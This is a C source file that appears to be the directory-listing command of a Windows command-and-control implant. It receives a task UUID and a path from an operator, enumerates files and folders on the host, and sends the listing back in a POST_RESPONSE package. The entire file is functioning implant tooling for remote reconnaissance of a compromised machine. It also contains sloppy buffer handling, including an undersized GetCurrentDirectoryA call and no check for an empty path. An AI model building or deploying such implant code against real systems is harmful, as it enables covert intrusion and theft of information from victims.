#include <windows.h>
#include <stdio.h>
#include "dir.h"
#include "../Command.h"
#include "../Utils.h"

BOOL executeDir(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) 
    {
        LOG("[-] executeDir: Failed to get UUID");
        return FALSE;
    }

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    if (!taskUuid) { LocalFree(uuidBytes); return FALSE; }
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    LOG("[*] Task UUID: %s", taskUuid);

    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;
    
    // 3. Get Path
    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);
    
    // Prepare Response Packages
    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    if (!cmdBytes)
    {
        LOG("[-] executeDir: Failed to get Path");
        // We still send response, but with error
        char* err = "Missing path argument";
        PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }
    else
    {
        PCHAR path = (PCHAR)LocalAlloc(LPTR, cmdLen + 3); // +3 for \*, \0
        if (path)
        {
            memcpy(path, cmdBytes, cmdLen);
            path[cmdLen] = '\0';
            
            // Logic to handle "dir ." command from shell which often means "current directory"
            if (strcmp(path, ".") == 0)
            {
                GetCurrentDirectoryA(cmdLen + 3, path); // Overwrite with full path if possible, or just use *
                // actually GetCurrentDirectory needs size. simple:
                strcpy(path, "*");
            }
            else
            {
                // Simple logic: if it doesn't end in *, append \*
                // Assumes input is a directory path
                char last = path[strlen(path)-1];
                if (last != '*')
                {
                    if (last != '\\' && last != '/')
                        strcat(path, "\\*");
                    else
                        strcat(path, "*");
                }
            }
            
            LOG("[*] Listing directory: %s", path);
            
            WIN32_FIND_DATA findData;
            HANDLE hFind = FindFirstFile(path, &findData);
            
            if (hFind == INVALID_HANDLE_VALUE)
            {
                char* err = "Failed to list directory";
                PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
            }
            else
            {
                do
                {
                    // Output format: <DIR> Name\n or <FILE> Name\n
                    const char* typeKey = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "D" : "F";
                    char line[MAX_PATH + 20];
                    snprintf(line, sizeof(line), "%s\t%s\n", typeKey, findData.cFileName);
                    
                    PackageAddBytesRaw(output, (PBYTE)line, strlen(line));
                } while (FindNextFile(hFind, &findData));
                FindClose(hFind);
            }
            LocalFree(path);
        }
        LocalFree(cmdBytes);
    }
    
    LOG("[*] Output size: %d", output->length);
    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);

    LOG("[*] Sending POST_RESPONSE...");
    PParser ResponseParser = sendPackage(responseTask);
    
    if (ResponseParser)
    {
        LOG("[+] POST_RESPONSE succcess");
        ParserDestroy(ResponseParser);
    }
    
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);


    return TRUE;
}
